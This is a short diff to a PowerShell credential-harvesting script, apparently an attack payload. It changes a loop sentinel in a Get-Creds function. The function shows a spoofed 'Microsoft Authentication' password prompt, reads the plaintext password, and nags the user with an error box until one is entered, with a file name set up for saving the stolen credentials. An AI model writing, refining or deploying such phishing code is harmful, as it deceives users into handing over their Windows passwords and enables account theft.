@@ -53,9 +53,9 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
 
-    $form = 0
+    $form = $null
 
-    while ($form -eq 0)
+    while ($form -eq $null)
     {
         $cred = $host.ui.promptforcredential('Microsoft Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
         $cred.getnetworkcredential().password
@@ -72,7 +72,7 @@ function Get-Creds {
             $msgButton = 'Ok'
             $msgImage = 'Stop'
             $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-            $form = 0
+            $form = $null
 	    continue
         }
         
